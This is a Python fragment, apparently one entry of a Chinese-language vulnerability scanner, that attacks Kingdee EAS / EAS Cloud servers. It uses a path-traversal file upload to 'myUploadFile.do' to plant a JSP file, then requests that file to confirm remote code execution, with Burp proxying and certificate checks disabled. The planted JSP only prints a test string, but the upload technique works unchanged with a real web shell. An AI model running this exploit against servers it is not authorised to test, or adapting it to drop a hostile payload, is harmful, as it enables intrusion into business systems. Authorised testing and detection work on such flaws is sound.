    if vulnerability == "90.金蝶EAS、EAS Cloud远程代码执行漏洞":
        if url.endswith("/"):
            path = "easportal/buffalo/../cm/myUploadFile.do"
        else:
            path = "/easportal/buffalo/../cm/myUploadFile.do"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        base_url = url + path

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "Connection": "close",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx",
            "Cookie": "sl-session=sqPhC9MLJmWsiN7c9/P6tA==",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "210",
            "SL-CE-SUID": "47"
        }
        data = '''------WebKitFormBoundarySq4lDnabv8CwHfvx\r\nContent-Disposition: form-data; name="myFile";\r\nfilename="/xiao.jsp"\r\nContent-Type: text/html\r\n\r\n<%out.println("test123");%>\r\n------WebKitFormBoundarySq4lDnabv8CwHfvx--'''

        append_to_output("===================================================================", "green")
        try:
            # 创建不验证SSL证书的HTTPSHandler
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            timeout_seconds = 10  # 设置超时时间（单位：秒）
            # 创建 HTTPSHandler
            https_handler = urllib.request.HTTPSHandler(context=context)

            # 设置 Burp 代理
            proxy_handler = urllib.request.ProxyHandler(
                {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})

            # 构建 Opener 并添加 HTTPSHandler
            opener = urllib.request.build_opener(https_handler, proxy_handler)

            # 构建请求对象
            request = urllib.request.Request(base_url, data=data.encode('utf-8'), headers=headers)

            # 发送 POST 请求
            response = opener.open(request, timeout=timeout_seconds)
            result = str(response.read())
            if response.getcode() == 200:
                append_to_output(f"[+] {url} 可能存在金蝶EAS、EAS Cloud远程代码执行漏洞！！！！", "yellow")
                if url.endswith("/"):
                    path = "easportal/buffalo/../xiao.jsp"
                else:
                    path = "/easportal/buffalo/../xiao.jsp"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url

                encodetext = url + path
                # 设置Burp代理
                proxy_handler = urllib.request.ProxyHandler(
                    {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
                # 构建Opener
                opener = urllib.request.build_opener(proxy_handler)
                # 构建请求对象
                request = urllib.request.Request(encodetext)
                # 发送POST请求
                response = opener.open(request)
                result = str(response.read())
                if response.getcode() == 200 and 'test123' in result:
                    append_to_output(f"[+] 存在金蝶EAS、EAS Cloud远程代码执行漏洞！！！！", "red")
                    append_to_output(result, "yellow")
                    with open("output.txt", "a") as file:
                        file.write(f"[+] {url} 存在金蝶EAS、EAS Cloud远程代码执行漏洞！！！！" + "\n")
                        file.write(result + "\n")
                else:
                    append_to_output(f"[-] {url} 不存在金蝶EAS、EAS Cloud远程代码执行漏洞", "green")
            else:
                append_to_output(f"[-] {url} 不存在金蝶EAS、EAS Cloud远程代码执行漏洞", "green")
        except Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except Exception as e:
            if 'timed out' in str(e):
                append_to_output("请求超时，执行下一个URL测试", "yellow")
            if '404' in str(e):
                append_to_output("请求响应内容不存在，执行下一个URL测试", "yellow")
            if '405' in str(e):
                append_to_output("请求被拒绝，可能存在防火墙，执行下一个URL测试", "yellow")
            if '403' in str(e):
                append_to_output("你的IP被列入黑名单，执行下一个URL测试", "yellow")
            if 'SSL' in str(e):
                append_to_output("你的证书不被允许，执行下一个URL测试", "yellow")
            if '500' in str(e):
                append_to_output("服务器内部出现错误，执行下一个URL测试", "yellow")
            else:
                append_to_output(str(e), "yellow")
